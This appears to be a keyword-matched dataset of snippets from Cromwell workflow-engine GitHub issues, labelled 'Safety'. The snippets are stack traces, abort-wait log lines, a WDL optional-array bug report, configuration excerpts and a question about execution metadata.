Safety,te)'.; at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBack\; endJobExecutionActor.scala:84); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyn\; cBackendJobExecutionActor.scala:629); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsync\; BackendJobExecutionActor.scala:636); at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsync\; BackendJobExecutionActor.scala:88); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionAc\; tor.scala:1114); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionAc\; tor.scala:1110); at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.fo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5001:1864,recover,recoverWith,1864,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5001,1,['recover'],['recoverWith']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:19,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:20,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:21,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:22,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:23,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:24,84] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonC",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:7421,abort,abort,7421,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9522,abort,abort,9522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound"";",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:11761,abort,abort,11761,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:42,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:43,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:44,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:45,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:46,38] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.A",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:14276,abort,abort,14276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16308,abort,abort,16308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractG",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:18825,abort,abort,18825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"teUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.new",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21133,abort,abort,21133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tead, Cromwell seems to think it is defined, and it has a length. This can cause all sorts of issues, such as breaking downstream tasks that are only supposed to run if the optional upstream task has run, and some very odd error messages. Simple example:; ```; # task_a and task_b are mutually exclusive scattered tasks; Array[File?] vcfs = select_first([task_a.vcf_out, task_b.vcf_out]); ```; Due to this bug, vcfs will yield an empty array if task_a did not run, even though task_b did run. This gets quite messy if you need to process the output of mutually exclusive tasks later. More involved example: ; ```; # variant_call_after_earlyQC_filtering is an optional task, so variant_call_after_earlyQC_filtering.errorcode is an optional type; if(defined(variant_call_after_earlyQC_filtering.errorcode)) {. # variant_call_after_earlyQC_filtering is a scattered task, so variant_call_after_earlyQC_filtering.errorcode is an array; # this length check should be redundant with the defined check earlier, but neither of them seem to work properly; if(length(variant_call_after_earlyQC_filtering.errorcode) > 0) {; 	; # get the first (0th) value and coerce it into type String; 	String coerced_vc_filtered_errorcode = select_first([variant_call_after_earlyQC_filtering.errorcode[0], ""FALLBACK""]); 	call echo as echo_a {input: integer=length(variant_call_after_earlyQC_filtering.errorcode), string=variant_call_after_earlyQC_filtering.errorcode[0]}; 	call echo as echo_b {input: string=coerced_vc_filtered_errorcode}; call echo_array as echo_c {input: strings=variant_call_after_earlyQC_filtering.errorcode}; }; }; ```. Output:; * echo_a will echo ""1"" for input _integer_ and an empty string for input _string_; * echo_b will echo ""FALLBACK"" for input _string_; * echo_c will cause an error ; * `""message"":""Cannot interpolate Array[String?] into a command string with attribute set [PlaceholderAttributeSet(None,None,None,Some( ))]""`; * This error occurs even if echo_array takes in non-optional Array[Str",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7201:1049,redund,redundant,1049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7201,1,['redund'],['redundant']
Safety,"ter is initialized in code, this is the number of workers; #number-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; input-read-limits {; #lines = 128000; #bool = 7; #int = 19; #float = 50; #string = 128000; #json = 128000; #tsv = 128000; #map = 128000; #object = 128000; }. abort {; # These are the default values in Cromwell, in most circumstances there should not be a need to change them. # How frequently Cromwell should scan for aborts.; scan-frequency: 30 seconds. # The cache of in-progress aborts. Cromwell will add entries to this cache once a WorkflowActor has been messaged to abort.; # If on the next scan an 'Aborting' status is found for a workflow that has an entry in this cache, Cromwell will not ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the l",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:3343,abort,aborts,3343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['abort'],['aborts']
Safety,ternal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallTimeoutTrackingStage.executeWithTimer(A,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1519,Timeout,TimeoutExceptionHandlingStage,1519,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,"testing/analysis/04_RNA-seq/samples/S1/lib_lib1/star/S1-lib1.Aligned.sortedByCoord.out.bam.bai; ```; The rerun uses this:; ```; samtools index /exports/sasc/biowdl-testing/src/04_RNA-seq/cromwell-executions/pipeline/14df3e76-ea79-4423-bfa2-1198de69cd1b/call-sample/shard-0/sample/0380d883-7bc4-4ef5-ac60-b3bbee90e53d/call-library/shard-0/library/c6c844c8-6e18-44ac-9cff-01a9da900159/call-starAlignment/AlignStar/bb11fd8a-33f9-4343-bf4b-bf397e063ecc/call-samtoolsIndex/inputs/exports/sasc/biowdl-testing/src/04_RNA-seq/cromwell-executions/pipeline/14df3e76-ea79-4423-bfa2-1198de69cd1b/call-sample/shard-0/sample/0380d883-7bc4-4ef5-ac60-b3bbee90e53d/call-library/shard-0/library/c6c844c8-6e18-44ac-9cff-01a9da900159/call-starAlignment/AlignStar/bb11fd8a-33f9-4343-bf4b-bf397e063ecc/call-star/analysis/04_RNA-seq/samples/S1/lib_lib1/star/S1-lib1.Aligned.sortedByCoord.out.bam /exports/sasc/biowdl-testing/src/04_RNA-seq/cromwell-executions/pipeline/14df3e76-ea79-4423-bfa2-1198de69cd1b/call-sample/shard-0/sample/0380d883-7bc4-4ef5-ac60-b3bbee90e53d/call-library/shard-0/library/c6c844c8-6e18-44ac-9cff-01a9da900159/call-starAlignment/AlignStar/bb11fd8a-33f9-4343-bf4b-bf397e063ecc/call-star/analysis/04_RNA-seq/samples/S1/lib_lib1/star/S1-lib1.Aligned.sortedByCoord.out.bam.bai; ```; The second argument changes from the intended path to a path inside of the execution folder. It looks like the output from the preceding mapping job gets linked to in the execution folder after restarting the workflow. Which is used as output for that job(?). This output `File` is used to determine what the name for the output of the indexing call is. Which is now different because it now points at the link in the execution folder, rather than the actual output the mapping job produced. As such the expected output doesn't exist and the job gets rerun. ; Am I correct in these statements? If so, is there a way this can be avoided? (ie. Is there a way the original output path can be remembered between restarts?)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717:2909,avoid,avoided,2909,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717,1,['avoid'],['avoided']
Safety,text$.withBlockContext(BlockContext.scala:81); at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); at cats.effect.internals.Trampoline.execute(Trampoline.scala:43) ; at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); at cats.effect.internals.IOBracket$BracketStart.apply(IOBracket.scala:60); at cats.effect.internals.IOBracket$BracketStart.apply(IOBracket.scala:41); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:134); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); at cats.effect.internals.IOBracket$.$anonfun$apply$1(IOBracket.scala:36); at cats.effect.internals.IOBracket$.$anonfun$apply$1$adapted(IOBracket.scala:33); at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:328); at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:117); at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); at cats.effect.IO.unsafeRunAsync(IO.scala:258); at cats.effect.IO.unsafeToFuture(IO.scala:345); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeAsync(AwsBatchAsyncBackendJobExecutionActor.scala:342); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:943); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBacken,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303:5956,unsafe,unsafeRunAsync,5956,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303,1,['unsafe'],['unsafeRunAsync']
Safety,"the Cromwell metadata as described by [the paragraph about metadata in the Cromwell docs](https://cromwell.readthedocs.io/en/stable/SubWorkflows/). When executing a workflow written in WDL and executed with Cromwell (the scientific workflow engine) one can extract metadata out of the Cromwell database. Within this metadata, the following ""executionEvents"" are available for each ""workflow.task"" in the ""calls"" objects. Pending; Requesting ExecutionToken; WaitingFor ValueStore; PreparingJob; CallCache Reading; RunningJob; Updating CallCache; Updating JobStore. From the documentation:; [Call Caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) allows Cromwell to detect when a job has been run in the past so that it doesn't have to re-compute results, saving both time and money. The main purpose of the [Job Store table](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/workflowSubworkflowAndJobStores/#job-store-job_store_entry) is to support resuming execution of a workflow when Cromwell is restarted by recovering the outputs of completed jobs. I couldn't find a description of the Execution Token nor of the [Value Store](https://cromwell.readthedocs.io/en/stable/developers/bitesize/workflowExecution/jobKeyValueStore/) in [the docs](https://cromwell.readthedocs.io/en/develop/developers/Arch). My questions are the following:. What is the engine waiting on when a task/job is ""Pending""?; Is Requesting an Execution Token something that happens for every task because of security reasons, or does it have to do with the allowed capacity for Cromwell? What types of token are we talking about?; What happens during Value Store, where are which values stored and why are we waiting on it rather than doing it?; is this, for example, collecting default environment variables that should be set before running the workflow; or; is it collecting the values of variables that are used in the workflow, provided with the 